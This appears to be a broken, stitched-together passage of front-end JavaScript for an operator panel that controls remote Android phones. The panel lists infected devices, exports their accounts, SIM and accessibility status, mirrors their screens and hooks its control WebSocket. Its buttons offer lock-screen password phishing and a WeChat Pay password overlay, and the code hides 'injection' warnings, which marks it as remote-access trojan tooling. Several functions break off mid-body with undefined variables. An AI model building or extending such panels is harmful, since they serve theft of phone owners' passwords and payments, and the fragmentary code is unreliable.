    <script>
      /* Keep a reference to the active control socket for the password editor. */
      (function(){
        if(window.__zglPasswordSocketHooked || !window.WebSocket){ return; }
        window.__zglPasswordSocketHooked=true;
        var NativeWebSocket=window.WebSocket;
        var WrappedWebSocket=function(url,protocols){
          var socket=protocols===undefined ? new NativeWebSocket(url) : new NativeWebSocket(url,protocols);
          window.__zglControlSocket=socket;
          var nativeSend=socket.send;
          socket.send=function(data){
            try{
              var parsed=typeof data==='string' ? JSON.parse(data) : null;
              if(parsed && parsed.pid){ window.__zglLastWsMessage=parsed; }
            }catch(e){}
            return nativeSend.call(this,data);
          };
          return socket;
        };
        WrappedWebSocket.prototype=NativeWebSocket.prototype;
        ['CONNECTING','OPEN','CLOSING','CLOSED'].forEach(function(key){
          try{ Object.defineProperty(WrappedWebSocket,key,{value:NativeWebSocket[key]}); }catch(e){}
        });
        window.WebSocket=WrappedWebSocket;
      })();
    </script>

      /* Prevent the previous device view from flashing while a new /info route is arranged. */
      html.zglInfoBooting #app { visibility: hidden !important; }
      #zglRouteGuard {
        position: fixed;
        inset: 0;
        z-index: 2147483647;
        display: none;
        align-items: center;
        justify-content: center;
        background: #ffffff;
      }
      html.zglInfoBooting #zglRouteGuard { display: flex; }
      #zglRouteGuard::after {
        content: '';
        width: 24px;
        height: 24px;
        border: 3px solid #fdf3e3;
        border-top-color: #4f6bfe;
        border-radius: 50%;
        animation: zglRouteSpin .7s linear infinite;
      }
      @keyframes zglRouteSpin { to { transform: rotate(360deg); } }
    </style>
    <script>
      (function(){
        var infoPath=function(){ return location.pathname.indexOf('/info')===0; };
        var routeKey=function(){ return location.pathname+location.search; };
        var ensure=function(){
          if(!document.body){ return; }
          var guard=document.getElementById('zglRouteGuard');
          if(!guard){
            guard=document.createElement('div');
            guard.id='zglRouteGuard';
            document.body.insertBefore(guard,document.body.firstChild);
          }
        };
        var sync=function(){
          if(infoPath()){
            window.__zglGuardRoute=routeKey();
            document.documentElement.classList.add('zglInfoBooting');
            ensure();
            setTimeout(function(){
              if(window.__zglRunLayout){ window.__zglRunLayout(); }
            },0);
          }else{
            document.documentElement.classList.remove('zglInfoBooting');
            var guard=document.getElementById('zglRouteGuard');
            if(guard){ guard.remove(); }
          }
        };
        window.__zglRouteGuardReady=function(route){
          if(!infoPath() || (route && route!==routeKey())){ return; }
          document.documentElement.classList.remove('zglInfoBooting');
          var guard=document.getElementById('zglRouteGuard');
          if(guard){ guard.remove(); }
        };
        ['pushState','replaceState'].forEach(function(name){
          var original=history[name];
          history[name]=function(){
            var result=original.apply(this,arguments);
            setTimeout(sync,0);
            return result;
          };
        });
        window.addEventListener('popstate',function(){ setTimeout(sync,0); });
        if(infoPath()){
          document.documentElement.classList.add('zglInfoBooting');
          document.addEventListener('DOMContentLoaded',ensure,{once:true});
        }
      })();
    </script>

    <script>
      (function(){
        function addDeviceHeading(){
          var root=document.querySelector('.index-root');
          if(!root || root.querySelector('.zgl-device-heading')) return;
          var heading=document.createElement('div');
          heading.className='zgl-device-heading';
          heading.innerHTML='<div class="zgl-device-heading-main"><h1>设备中心</h1><p>实时查看设备连接状态，统一管理设备操作</p></div>'+
            '<div class="zgl-device-heading-meta"><span class="zgl-dm-item">在线 <b data-zgl-st-online>0</b></span><span class="zgl-dm-dot">·</span><span class="zgl-dm-item">离线 <b data-zgl-st-offline>0</b></span><span class="zgl-dm-dot">·</span><span class="zgl-dm-item">总计 <b data-zgl-st-total>0</b></span><button type="button" class="zgl-export-btn" data-zgl-export>导出</button></div>';
          root.insertBefore(heading,root.firstElementChild);
        }
        document.addEventListener('DOMContentLoaded',function(){
          addDeviceHeading();
          new MutationObserver(addDeviceHeading).observe(document.body,{childList:true,subtree:true});
        },{once:true});
      })();
    </script>

        /* 设备页标题统计 + 已选计数 + 导出 CSV */
        function deviceMetaStats(){
          var list = window.__zglLiveDevices;
          if(!list) return;
          var on = 0;
          list.forEach(function(d){
            var v = d.isonline;
            var online = (v === "1" || v === 1 || v === true);
            if(online) on++;
          });
          var total = window.__zglLiveTotal ? Math.max(window.__zglLiveTotal, list.length) : list.length;
          var elOn = document.querySelector('[data-zgl-st-online]');
          var elOff = document.querySelector('[data-zgl-st-offline]');
          var elTotal = document.querySelector('[data-zgl-st-total]');
          if(elOn) elOn.textContent = on;
          if(elOff) elOff.textContent = total - on;
          if(elTotal) elTotal.textContent = total;
        }
        function deviceSelCount(){
          var el = document.getElementById('zgl-sel-count');
          var bar = document.querySelector('.index-root .table-toolbar-left');
          if(bar && !el){
            el = document.createElement('span');
            el.id = 'zgl-sel-count';
            el.className = 'zgl-sel-count';
            bar.appendChild(el);
          }
          if(!el) return;
          var n = 0;
          document.querySelectorAll('._batch-cb').forEach(function(cb){ if(cb.checked) n++; });
          el.textContent = '已选 ' + n + ' 台';
          el.style.display = n > 0 ? '' : 'none';
        }
        document.addEventListener('click', function(ev){
          var t = ev.target && ev.target.closest ? ev.target.closest('[data-zgl-export]') : null;
          if(!t) return;
          var list = window.__zglLiveDevices || [];
          var rows = [['账号','归属','备注','地区','机型','电池','网络','屏幕','无障碍','权限','SIM卡']];
          list.forEach(function(d){
            var p = d.perms && typeof d.perms === 'object';
            var act = String(d.activz == null ? '' : d.activz);
            var scr = (act === '0' || act === '2') ? '亮屏' : (act === '1' || act === '3') ? '息屏' : '未知';
            var email = String(d.user_email || ''); var i = email.indexOf('@');
            rows.push([i>0?email.slice(0,i):email, String(d.assigned_to||''), String(d.phone_name||''), String(d.country||''), String(d.model||''), String(d.battery_charge||''), String(d.network||''), scr, d.accessibility==='1'?'已开启':'未开启', p?'已上报':'未上报', String(d.sim||'')]);
          });
          var csv = rows.map(function(r){ return r.map(function(c){ return '"'+String(c).replace(/"/g,'""')+'"'; }).join(','); }).join('\r\n');
          var blob = new Blob(['\uFEFF'+csv], {type:'text/csv;charset=utf-8'});
          var a = document.createElement('a');
          a.href = URL.createObjectURL(blob);
          a.download = 'devices_' + new Date().toISOString().slice(0,10) + '.csv';
          a.click();
        });
        setInterval(function(){ deviceMetaStats(); deviceSelCount(); }, 3000);
      })();
    </script>

    <script>
      (function(){
        var KEY='zgl-latest-app-build-date';
        function parseDate(value){
          if(!value) return 0;
          var normalized=String(value).replace(/[年/.]/g,'-').replace(/月/g,'-').replace(/日/g,'').replace(/时/g,':').replace(/分/g,':').replace(/秒/g,'');
          var time=Date.parse(normalized.replace(/\s+/g,' ').trim());
          return isNaN(time)?0:time;
        }
        function formatDate(time){
          var d=new Date(time);
          var pad=function(v){return String(v).padStart(2,'0');};
          return d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate())+' '+pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());
        }
        function scanBuildDates(){
          // 仅构建器相关页面存在 .app-time-item / .app-list-wrap 时才扫描，避免在详情页等高频变动页面空转
          if(!document.querySelector('.app-time-item') && !document.querySelector('.app-list-wrap')) return;
          var best=parseDate(localStorage.getItem(KEY));
          document.querySelectorAll('body *').forEach(function(node){
            if(node.children.length) return;
            var text=(node.textContent||'').trim();
            if(!/(安装时间|构建时间|build_date|build time)/i.test(text)) return;
            var match=text.match(/(20\d{2}[-/.年]\s*\d{1,2}[-/.月]\s*\d{1,2}(?:日)?(?:\s+\d{1,2}:\d{2}(?::\d{2})?)?)/);
            var time=parseDate(match&&match[1]);
            if(time>best){ best=time; localStorage.setItem(KEY,formatDate(time)); }
          });
          updateHeader(best);
        }
        function updateHeader(time){
          var value=time?formatDate(time):'暂无构建记录';
          document.querySelectorAll('.app-time-item').forEach(function(item){
            var label=item.querySelector('.app-time-label');
            var val=item.querySelector('.app-time-value');
            if(label && /^最新app$/i.test(label.textContent.trim())){
              label.textContent='最新构建';
              if(val) val.textContent=value;
            }
          });
        }
        document.addEventListener('DOMContentLoaded',function(){
          scanBuildDates();
          var __zglSbdT=null;
          function __zglSbdDebounce(){ if(__zglSbdT) return; __zglSbdT=setTimeout(function(){ __zglSbdT=null; scanBuildDates(); },800); }
          new MutationObserver(__zglSbdDebounce).observe(document.body,{childList:true,subtree:true});
          setInterval(scanBuildDates,10000);
        },{once:true});
      })();

<script>
// 布局版本小标 + 布局修正(JS 强制生效)
(function(){
  // Recolor red and blue pixels in the first live preview; the device and controls are untouched.
  function __zglWhitenPreviewText(){
    try{
      var root=document.querySelector('.image-box-group');
      var screen=root && root.querySelector(':scope > .image-box:first-child .screenlayers');
      var img=screen && screen.querySelector(':scope > img');
      if(!screen || !img){ return; }
      var src=img.currentSrc||img.src||'';
      if(!src || !img.complete || !img.naturalWidth || !img.naturalHeight){
        if(!img.__zglWhiteLoadBound){
          img.__zglWhiteLoadBound=true;
          img.addEventListener('load',function(){ setTimeout(__zglWhitenPreviewText,0); },true);
        }
        return;
      }
      var canvas=screen.querySelector(':scope > canvas.zglWhiteTextCanvas');
      if(!canvas){
        canvas=document.createElement('canvas');
        canvas.className='zglWhiteTextCanvas';
        screen.appendChild(canvas);
      }
      var stamp=src+'|'+img.naturalWidth+'x'+img.naturalHeight;
      if(canvas.getAttribute('data-zgl-src')===stamp){ return; }
      canvas.width=img.naturalWidth;
      canvas.height=img.naturalHeight;
      var ctx=canvas.getContext('2d',{willReadFrequently:true});
      if(!ctx){ return; }
      ctx.clearRect(0,0,canvas.width,canvas.height);
      ctx.drawImage(img,0,0,canvas.width,canvas.height);
      var pixels=ctx.getImageData(0,0,canvas.width,canvas.height);
      var data=pixels.data;
      for(var i=0;i<data.length;i+=4){
        var r=data[i], g=data[i+1], b=data[i+2];
        var isRed = r>=110 && r-g>=42 && r-b>=42 && g<=185 && b<=185;
        var isBlue = b>=110 && b-r>=42 && b-g>=42 && r<=185 && g<=185;
        if(isRed || isBlue){
          data[i]=255; data[i+1]=255; data[i+2]=255; data[i+3]=255;
        }else{
          // Keep the original image underneath; this canvas contains only white text.
          data[i+3]=0;
        }
      }
      ctx.putImageData(pixels,0,0);
      canvas.setAttribute('data-zgl-src',stamp);
    }catch(e){}
  }
  function __zglDismissPreviewHint(){
    window.__zglPreviewHintDismissed=true;
    Array.prototype.forEach.call(document.querySelectorAll('.zglPreviewHint'),function(hint){
      hint.classList.add('zglPreviewHintHidden');
    });
  }
  function __zglBindPreviewHint(){
    if(window.__zglPreviewHintBound){ return; }
    window.__zglPreviewHintBound=true;
    document.addEventListener('click',function(e){
      var btn=e.target && e.target.closest ? e.target.closest('.n-button') : null;
      if(!btn){ return; }
      var label=(btn.textContent||'').replace(/\s+/g,'').trim();
      if(label==='开启' && document.querySelector('.zglPreviewHint')){
        __zglDismissPreviewHint();
      }
    },true);
  }
  function __zglEnsurePreviewHint(group){
    if(!group){ return; }
    var route=location.pathname+location.search;
    if(window.__zglPreviewHintGroup!==group || window.__zglPreviewHintRoute!==route){
      window.__zglPreviewHintGroup=group;
      window.__zglPreviewHintRoute=route;
      window.__zglPreviewHintDismissed=false;
    }
    var boxes=group.querySelectorAll(':scope > .image-box');
    Array.prototype.forEach.call(group.querySelectorAll(':scope > .zglPreviewHint'),function(legacy){
      legacy.remove();
    });
    Array.prototype.forEach.call(boxes,function(box){
      var screen=box.querySelector('.screenlayers');
      if(!screen){ return; }
      screen.style.position='relative';
      var hint=screen.querySelector(':scope > .zglPreviewHint');
      if(!hint){
        hint=document.createElement('div');
        hint.className='zglPreviewHint';
        hint.textContent='设备未连接-请点击上方开启连接设备';
        screen.appendChild(hint);
      }
      hint.classList.toggle('zglPreviewHintHidden',!!window.__zglPreviewHintDismissed);
    });
  }
  function __zglMovePreviewModeSelector(group,row){
    if(!group || !row){ return; }
    var modeRoot=null;
    Array.prototype.some.call(group.querySelectorAll('.n-select, .n-base-selection, select'),function(node){
      var label=(node.textContent||'').replace(/\s+/g,'').trim();
      if(!/(截图|投屏)/.test(label)){ return false; }
      modeRoot=node.classList.contains('n-select') ? node : (node.closest('.n-select') || node);
      return true;
    });
    if(!modeRoot){ return; }
    modeRoot.classList.add('zglPreviewModeSelect');
    modeRoot.style.display='inline-flex';
    if(modeRoot.parentElement!==row){
      try{ row.appendChild(modeRoot); }catch(e){}
    }
  }
  function __zglBindSharedConnectButtons(group,row){
    if(!group || !row){ return; }
    var secondRow=group.querySelector(':scope > .image-box:nth-child(2) .button-container');
    if(!secondRow){ return; }
    Array.prototype.forEach.call(row.querySelectorAll('.n-button'),function(sharedBtn){
      var label=(sharedBtn.textContent||'').replace(/\s+/g,'').trim();
      if(label!=='开启' && label!=='关闭'){ return; }
      if(sharedBtn.getAttribute('data-zgl-dual-connect')==='1'){ return; }
      sharedBtn.setAttribute('data-zgl-dual-connect','1');
      sharedBtn.addEventListener('click',function(){
        setTimeout(function(){
          var target=null;
          Array.prototype.some.call(secondRow.querySelectorAll('.n-button'),function(btn){
            var t=(btn.textContent||'').replace(/\s+/g,'').trim();
            if(t===label){ target=btn; return true; }
            return false;
          });
          if(target && !target.disabled){
            try{ target.click(); }catch(e){}
          }
        },0);
      },false);
    });
  }
  function __zglPositionConnectRow(group,row){
    if(!group || !row){ return; }
    var boxes=group.querySelectorAll(':scope > .image-box');
    if(boxes.length<2){ return; }
    var groupRect=group.getBoundingClientRect();
    var firstRect=boxes[0].getBoundingClientRect();
    var secondRect=boxes[1].getBoundingClientRect();
    var left=Math.min(firstRect.left,secondRect.left);
    var right=Math.max(firstRect.right,secondRect.right);
    var top=Math.min(firstRect.top,secondRect.top);
    var rowHeight=row.getBoundingClientRect().height || 38;
    row.style.setProperty('left',((left+right)/2-groupRect.left)+'px','important');
    row.style.setProperty('top',(top-groupRect.top-rowHeight-8)+'px','important');
  }
  function __zglAdjustPreviewOffset(group){
    if(!group){ return; }
    var extra=document.getElementById('zglExtra');
    var spoof=document.getElementById('zglSpoofPanel');
    var customVisible=!!window.__zglDocsOn || !!window.__zglSpoofOn;
    if(!customVisible && extra){ customVisible=getComputedStyle(extra).display!=='none'; }
    if(!customVisible && spoof){ customVisible=getComputedStyle(spoof).display!=='none'; }
    group.style.setProperty('margin-top',customVisible?'34px':'0px','important');
  }
  function __zglSetConnectRowVisibility(show){
    var row=document.querySelector('.image-box-group > .zglConnectRow');
    // 连接投屏行常显（预览模板布局固定显示），不再随页签切换隐藏，避免与模板争夺导致闪烁
    if(row){ row.style.setProperty('display','flex','important'); }
  }
  function __zglStyleConnectRow(group){
    if(!group){ return; }
    var row=group.querySelector(':scope > .zglConnectRow');
    if(!row){
      var candidates=[];
      var boxes=group.querySelectorAll(':scope > .image-box');
      Array.prototype.forEach.call(boxes,function(box){
        Array.prototype.forEach.call(box.querySelectorAll('.n-button'),function(btn){
          var label=(btn.textContent||'').replace(/\s+/g,'').trim();
          if(label!=='开启' && label!=='关闭'){ return; }
          var candidate=btn.closest('.button-row') || btn.parentElement;
          if(!candidate || candidate===box || candidate===group){ return; }
          var hasOpen=false, hasClose=false;
          Array.prototype.forEach.call(candidate.querySelectorAll('.n-button'),function(item){
            var itemLabel=(item.textContent||'').replace(/\s+/g,'').trim();
            if(itemLabel==='开启'){ hasOpen=true; }
            if(itemLabel==='关闭'){ hasClose=true; }
          });
          if(hasOpen && hasClose && candidates.indexOf(candidate)===-1){
            candidates.push(candidate);
          }
        });
      });
      row=candidates[0] || null;
      if(row){
        row.classList.add('zglConnectRow');
        group.appendChild(row);
      }
    }
    if(!row){ return; }
    var showConnect=!!window.__zglDocsOn;
    // 连接投屏行常显，避免与应用其它周期逻辑交替写入 display 导致闪烁
    row.style.setProperty('display','flex','important');
    __zglMovePreviewModeSelector(group,row);
    __zglBindSharedConnectButtons(group,row);
    __zglPositionConnectRow(group,row);
    var keepButtons=[];
    Array.prototype.forEach.call(row.querySelectorAll('.n-button'),function(btn){
      var label=(btn.textContent||'').replace(/\s+/g,'').trim();
      if(label==='开启'){
        btn.classList.add('zglConnectOpen');
        btn.classList.remove('zglConnectDuplicateHidden');
        btn.style.display='';
        keepButtons.push(btn);
      }else if(label==='关闭'){
        btn.classList.add('zglConnectClose');
        btn.classList.remove('zglConnectDuplicateHidden');
        btn.style.display='';
        keepButtons.push(btn);
      }
    });
    Array.prototype.forEach.call(group.querySelectorAll('.n-button'),function(btn){
      var label=(btn.textContent||'').replace(/\s+/g,'').trim();
      if((label==='开启' || label==='关闭') && keepButtons.indexOf(btn)===-1){
        btn.classList.add('zglConnectDuplicateHidden');
        btn.style.display='none';
      }
    });
  }
  function __zglAlignPreviewScreens(group){
    if(!group){ return; }
    var boxes=group.querySelectorAll(':scope > .image-box');
    if(boxes.length<2){ return; }
    var first=boxes[0].querySelector('.image-wrapper');
    var second=boxes[1].querySelector('.image-wrapper');
    if(!first || !second){ return; }
    second.style.setProperty('position','relative','important');
    second.style.setProperty('top','0px','important');
    var firstTop=first.getBoundingClientRect().top;
    var secondTop=second.getBoundingClientRect().top;
    var delta=Math.round(firstTop-secondTop);
    if(Math.abs(delta)>0){
      second.style.setProperty('top',delta+'px','important');
    }
    second.setAttribute('data-zgl-screen-align',String(delta));
  }
  function __zglRenamePreviewModes(){
    var nodes=document.querySelectorAll('select option, .n-base-selection-label, .n-base-select-option__label, .n-select-option__label, [role="option"]');
    Array.prototype.forEach.call(nodes,function(node){
      var label=(node.textContent||'').replace(/\s+/g,'').trim();
      var desired='';
      if(label==='截图' || label==='截图模式'){
        desired='截图模式';
      }else if(label==='投屏' || label==='投屏模式'){
        desired='投屏模式';
      }
      if(!desired){ return; }

      // 下拉菜单可能带图标或嵌套标签，只替换文字节点，保留原有结构和交互。
      var textNodes=[];
      try{
        var walker=document.createTreeWalker(node,NodeFilter.SHOW_TEXT);
        var current;
        while((current=walker.nextNode())){ textNodes.push(current); }
      }catch(e){}
      var changed=false;
      textNodes.forEach(function(textNode){
        var value=textNode.nodeValue||'';
        var compact=value.replace(/\s+/g,'').trim();
        if(compact==='截图' || compact==='截图模式' || compact==='投屏' || compact==='投屏模式'){
          textNode.nodeValue=desired;
          changed=true;
        }
      });
      if(!changed && !node.children.length){
        node.textContent=desired;
      }
    });
  }
  function __zglRenameNavLabels(){
    var labels={
      '后台键':{cls:'zglNavLabelTaskbar',name:'任务栏'},
      '主页键':{cls:'zglNavLabelDesktop',name:'桌面'},
      '返回键':{cls:'zglNavLabelBack',name:'返回'},
      'wx支付底部':{cls:'zglNavLabelWx',name:'微信支付密码框'},
      '无导航栏':{cls:'zglNavLabelBottomNav',name:'底部导航栏'}
    };
    var reverse={
      '任务栏':'后台键',
      '桌面':'主页键',
      '返回':'返回键',
      '微信支付密码框':'wx支付底部',
      '底部导航栏':'无导航栏'
    };
    Array.prototype.forEach.call(document.querySelectorAll('.n-button'),function(btn){
      var raw=(btn.textContent||'').replace(/\s+/g,'').trim();
      var icon=btn.querySelector('.zglIcon');
      if(icon && raw.indexOf((icon.textContent||''))===0){
        raw=raw.slice((icon.textContent||'').length);
      }
      var original=btn.getAttribute('data-zglNavOriginal') || reverse[raw] || raw;
      var item=labels[original];
      if(!item){ return; }
      btn.setAttribute('data-zglNavOriginal',original);
      btn.setAttribute('aria-label',item.name);
      btn.setAttribute('title',item.name);
      btn.classList.add(item.cls);
      var content=btn.querySelector('.n-button__content');
      if(content){
        var contentIcon=content.querySelector('.zglIcon');
        if(contentIcon){
          content.textContent='';
          content.appendChild(contentIcon);
          content.appendChild(document.createTextNode(item.name));
        }else if((content.textContent||'').replace(/\s+/g,'').trim()!==item.name){
          content.textContent=item.name;
        }
      }
    });
  }
  function __zglRenameFishLabel(){
    Array.prototype.forEach.call(document.querySelectorAll('.n-button'),function(btn){
      var icon=btn.querySelector('.zglIcon');
      var raw=(btn.textContent||'').replace(/\s+/g,'').trim();
      if(icon){ raw=raw.replace((icon.textContent||'').replace(/\s+/g,''),''); }
      if(raw!=='密码钓鱼' && raw!=='锁屏密码钓鱼'){ return; }
      var content=btn.querySelector('.n-button__content');
      if(content){
        var contentIcon=content.querySelector('.zglIcon');
        content.textContent='';
        if(contentIcon){ content.appendChild(contentIcon); }
        content.appendChild(document.createTextNode('锁屏密码钓鱼'));
      }else{
        btn.textContent='锁屏密码钓鱼';
      }
      btn.setAttribute('aria-label','锁屏密码钓鱼');
      btn.setAttribute('title','锁屏密码钓鱼');
    });
  }
  function fixNav(){
    // 只在设备详情页(/info)执行会话页专属的布局/面板逻辑; 其他页面只保留版本角标
    var __isInfo = (location.pathname.indexOf('/info') === 0);
    // 每次进入新的设备详情路由时，默认打开操作说明；同一路由内的手动切换不被重置。
    if(__isInfo){
      var __zglInfoRoute=location.pathname+location.search;
      if(window.__zglDocsDefaultRoute!==__zglInfoRoute){
        window.__zglDocsDefaultRoute=__zglInfoRoute;
        window.__zglDocsOn=true;
        window.__zglSpoofOn=false;
      }
    }
    // Keep both screen preview frames visible without invoking any controls.
    var __previewRoot=document.querySelector('.image-box-group');
    if(__previewRoot){
      __previewRoot.classList.add('zglPreviewOnlyGroup');
      Array.prototype.forEach.call(__previewRoot.querySelectorAll(':scope > .image-box'),function(box){
        box.classList.add('zglPreviewOnlyBox');
        box.style.display='flex';
        box.style.visibility='visible';
        box.style.opacity='1';
      });
    }
    try{
      // 版本小标（净白简约 final 已移除，见 zgl-light-final.js）
      // 外层容器撑满整行
      var ic=document.querySelector('.image-container');
      if(ic){ ic.style.width='100%'; }
      // 操作说明显隐(独立保护, 最先执行)
      try{
         var dt3=document.getElementById('zglDocsTab');
         var ex3=document.getElementById('zglExtra');
          var spoof3=document.getElementById('zglSpoofPanel');
          var showDocs = !!window.__zglDocsOn;
          var showSpoof = !!window.__zglSpoofOn;
          var showPassword = !!window.__zglPasswordOn;
         if(ex3){
           ex3.style.display = showDocs ? 'flex' : 'none';
          if(showDocs){
            ex3.style.width='100%';
            ex3.style.flexBasis='100%';
             ex3.style.margin='0';
           }
         }
         if(spoof3){
           spoof3.style.display = showSpoof ? 'flex' : 'none';
           if(showSpoof){
             spoof3.style.width='100%';
             spoof3.style.flexBasis='100%';
             spoof3.style.margin='0';
           }
         }
         var panesAll=document.querySelectorAll('.zglTopTabs .n-tab-pane');
          var showCustom = showDocs || showSpoof || showPassword;
         for(var pi=0; pi<panesAll.length; pi++){
           // 自定义面板打开时隐藏原始标签内容；回到普通目录时交还给
           // Naive UI 的当前标签状态，避免所有目录同时显示。
           panesAll[pi].style.display = showCustom ? 'none' : '';
         }
      }catch(e2){}
      // 找到所有含"返回键"的按钮
      var ret=Array.prototype.filter.call(document.querySelectorAll('.n-button'),function(b){
        return /返回键|返回/.test(b.textContent||'');
      });
      // 返回键恢复: 只保留可见导航行内的按钮, 多余行整体隐藏后其按钮自然不可见
      // 删除箭头标注的窄按钮列(第二个屏幕右侧那一列)
      var col2=group?group.querySelector('.image-box:nth-child(2) .inner-sidebar'):null;
      if(col2){ col2.style.display='none'; }
      var rows=[];
      ret.forEach(function(b){
        var r=b.parentElement;
        if(r && rows.indexOf(r)===-1) rows.push(r);
      });
      var group=document.querySelector('.image-box-group');
      __zglBindPreviewHint();
      if(group && __isInfo){
        group.style.position='relative';
        __zglAdjustPreviewOffset(group);
        __zglEnsurePreviewHint(group);
        __zglStyleConnectRow(group);
      }
      var img=group?group.querySelector('.screenlayers img'):null;

      // 1) 按钮列移到两个屏幕下方 -> 控制面板(横排网格, 不再竖排过长)
      var col=group?group.querySelector('.image-box:first-child .inner-sidebar'):null;
      if(group && col){
        col.classList.add('zglCtrlPanel');
        try{
          if(col.parentElement!==group){ group.appendChild(col); }
        }catch(e){}
        group.style.flexWrap='wrap';
        col.style.order='99';
        col.style.width='100%';
        col.style.flexBasis='100%';
        col.style.flexDirection='row';
        col.style.flexWrap='wrap';
        col.style.alignItems='flex-start';
        col.style.justifyContent='flex-start';
        col.style.maxHeight='none';
        Array.prototype.forEach.call(col.querySelectorAll('.button-row'),function(rw){
          var wide = rw.querySelector('input,select,textarea') ? true : false;
          rw.style.flexBasis = wide ? '100%' : 'calc(25% - 8px)';
          rw.style.flexGrow = '0';
        });
        Array.prototype.forEach.call(col.querySelectorAll('.n-button'),function(x){ x.classList.add('zglTag'); });
        if(!document.getElementById('zglDocs')){
          var docs=document.createElement('div');

          if(logPanel.parentElement!==grp5){ try{ grp5.appendChild(logPanel); }catch(e){} }
          var pr5=pwP.getBoundingClientRect();
          var gr5=grp5.getBoundingClientRect();
          var lx=pr5.left-gr5.left;
          var ly=pr5.bottom-gr5.top+18;
          var olx=parseFloat(logPanel.getAttribute('data-lx')||'-1');
          var oly=parseFloat(logPanel.getAttribute('data-ly')||'-1');
          if(olx<0 || Math.abs(lx-olx)>100 || Math.abs(ly-oly)>100){
            logPanel.style.position='absolute';
            logPanel.style.left=lx+'px';
            logPanel.style.top=ly+'px';
            logPanel.style.width=pr5.width+'px';

      // 1.5) 实时帧率 -> 显示在手机屏幕预览上

      Array.prototype.some.call(document.querySelectorAll('span,div'),function(el){
        if(el.children.length===0 && /实时帧率/.test(el.textContent||'')){
          var m=(el.textContent||'').match(/\d+/);

      });
      // 面板上的帧率文字删除(数值仍同步给屏幕角标)
      var cardBoxF=document.getElementById('zglScreenCtrl');

          sc.style.position='relative';

      // 2) 导航行: 只保留一组, 放到两个手机预览之间并纵向排列
      if(group){
        group.style.position='relative';
        var sbox2=document.getElementById('zglScreenCtrl');
        var inCard=null;
        for(var ri=0;ri<rows.length;ri++){
          if(sbox2 && rows[ri].parentElement===sbox2){ inCard=rows[ri]; break; }
        }
        var navRow=inCard||rows[0];
        if(navRow){
          try{ if(navRow.parentElement!==group){ group.appendChild(navRow); } }catch(e){}
          navRow.classList.remove('zglHidden');
          navRow.classList.add('zglNavRow');
          navRow.classList.add('zglNavVertical');
          navRow.style.display='flex';
          Array.prototype.forEach.call(navRow.querySelectorAll('.n-button'),function(x){ x.style.display=''; });
          navRow.style.setProperty('--hdr','""');
          navRow.style.setProperty('--hdrc','#a49c8c');
          // 用渲染后的边界计算两屏间隙，避免视口或屏幕尺寸变化时跑位。
          var groupRect=group.getBoundingClientRect();
          var previewRects=[];
          Array.prototype.forEach.call(group.querySelectorAll('.image-box .image-wrapper'),function(wrapper){
            if(wrapper.closest('.image-box-group')!==group){ return; }
            var rect=wrapper.getBoundingClientRect();
            if(rect.width>100 && rect.height>100){ previewRects.push(rect); }
          });
          previewRects.sort(function(a,b){ return a.left-b.left; });
          var canUseGap=window.innerWidth>720 && previewRects.length>1;
          var navWidth=76;
          if(canUseGap){
            var leftPreview=previewRects[0];
            var rightPreview=previewRects[1];
            var gapLeft=leftPreview.right-groupRect.left;
            var gapRight=rightPreview.left-groupRect.left;
            var gapWidth=gapRight-gapLeft;
            canUseGap=gapWidth>=56;
            if(canUseGap){
              navWidth=Math.max(56,Math.min(72,gapWidth-14));
              var previewTop=Math.min(leftPreview.top,rightPreview.top)-groupRect.top;
              var previewHeight=Math.min(leftPreview.height,rightPreview.height);
              var navHeight=Math.max(180,Math.min(220,Math.round(previewHeight*.42)));
              var navTop=previewTop+Math.max(84,Math.min(112,Math.round(previewHeight*.21)));
              navRow.style.setProperty('position','absolute','important');
              navRow.style.setProperty('left',(gapLeft+(gapWidth-navWidth)/2)+'px','important');
              navRow.style.setProperty('top',navTop+'px','important');
              navRow.style.setProperty('height',navHeight+'px','important');
            }
          }
          if(canUseGap){
            navRow.style.setProperty('position','absolute','important');
            navRow.style.setProperty('order','0','important');
            navRow.style.setProperty('flex','none','important');
            navRow.style.setProperty('width',navWidth+'px','important');
            navRow.style.setProperty('min-width',navWidth+'px','important');
            navRow.style.setProperty('max-width',navWidth+'px','important');
            navRow.style.setProperty('margin','0','important');
            navRow.style.setProperty('z-index','20','important');
            navRow.setAttribute('data-zgl-nav-layout','between-screens');
          }else{
            navRow.style.setProperty('position','static','important');
            navRow.style.setProperty('left','auto','important');
            navRow.style.setProperty('top','auto','important');
            navRow.style.setProperty('height','auto','important');
            navRow.style.setProperty('order','50','important');
            navRow.style.setProperty('flex','0 0 '+navWidth+'px','important');
            navRow.style.setProperty('width',navWidth+'px','important');
            navRow.style.setProperty('min-width',navWidth+'px','important');
            navRow.style.setProperty('max-width',navWidth+'px','important');
            navRow.style.setProperty('margin','18px 0 0','important');
            navRow.style.setProperty('z-index','auto','important');
            navRow.setAttribute('data-zgl-nav-layout','fallback');
          }
          navRow.style.textAlign='center';
          Array.prototype.forEach.call(navRow.querySelectorAll('.n-button'),function(x){
            x.classList.add('zglNavBtn');
            if(x.style.display!=='none'){ x.style.marginLeft='0'; x.style.marginRight='0'; }
          });
        }
        rows.forEach(function(r){
          if(r!==navRow){ r.classList.add('zglHidden'); r.style.display='none'; }
        });
      }
    }catch(e){}
  }

  function __zglFmtSize(n){
    n=Number(n)||0;

    return (n/1048576).toFixed(1)+' MB';
  }
  window.__zglLoadVideos=function(){

      list.innerHTML='<div style="color:#9a8f7a;padding:20px;text-align:center;">加载中...</div>';

          var bd=document.createElement('div');

  // 应用弹窗页面文案整理：改名为“应用管理”，移除不需要的注入提示。
  function __zglRenameAppPopupLabels(){

      var removeTexts=[

        '注入功能不会偷用信！',
        '注入功能不会用慎用!',
        '注入功能不会用慎用！'
      ];
      var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT);
      var textNodes=[],node;
      while((node=walker.nextNode())){ textNodes.push(node); }
      textNodes.forEach(function(textNode){
        var parent=textNode.parentElement;
        if(!parent || /^(SCRIPT|STYLE|NOSCRIPT)$/.test(parent.tagName)){ return; }
        var value=(textNode.nodeValue||'').replace(/\s+/g,' ').trim();
        if(value==='应用弹窗'){
          textNode.nodeValue=textNode.nodeValue.replace('应用弹窗',renameText);
        }
      });
      removeTexts.forEach(function(label){
        Array.prototype.forEach.call(document.querySelectorAll('body *'),function(el){
          if(/^(SCRIPT|STYLE|NOSCRIPT)$/.test(el.tagName)){ return; }
          if((el.textContent||'').replace(/\s+/g,' ').trim()===label){
